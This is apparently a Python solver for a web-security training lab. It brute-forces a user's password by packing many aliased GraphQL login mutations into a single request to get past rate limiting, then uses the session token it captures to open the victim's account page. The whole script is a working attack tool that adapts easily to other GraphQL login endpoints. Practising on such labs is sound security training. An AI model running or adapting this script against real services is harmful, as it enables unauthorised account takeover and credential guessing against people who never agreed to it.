import requests
import sys
import urllib3, urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def create_payload(username, wordlist_path):
    with open(wordlist_path, 'r') as f:
        passwords = [line.strip() for line in f.readlines()]
    aliases = "\n".join([
        f'bruteforce{i}:login(input:{{password:"{pwd}",username:"{username}"}}){{token success}}'
        for i, pwd in enumerate(passwords)
    ])
    query = f"mutation{{\n{aliases}\n}}"
    return query, passwords

def bruteforce(s, url, path, query, passwords):
    target_url = url + path
    r = s.post(target_url, json={"query": query})

    data = r.json().get("data", {})
    for i, pwd in enumerate(passwords):
        attempt = data.get(f"bruteforce{i}", {})
        if attempt and attempt.get("success"):
            token = attempt.get("token")
            print(f"[+] Found password: {pwd}")
            print(f"[+] Token: {token}")
            return token
    print("[-] Password not found")
    return None

def goto(s, url, path):
    target_url = url + path
    r = s.get(target_url)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)
        
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 

    target_username = 'carlos'
    wordlist_path = 'common_passwords.txt'
    query, passwords = create_payload(target_username, wordlist_path)
    
    token = bruteforce(s, url, "/graphql/v1", query, passwords)
    if token:
        s.cookies.set("session", token)
    goto(s, url, '/my-account')
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()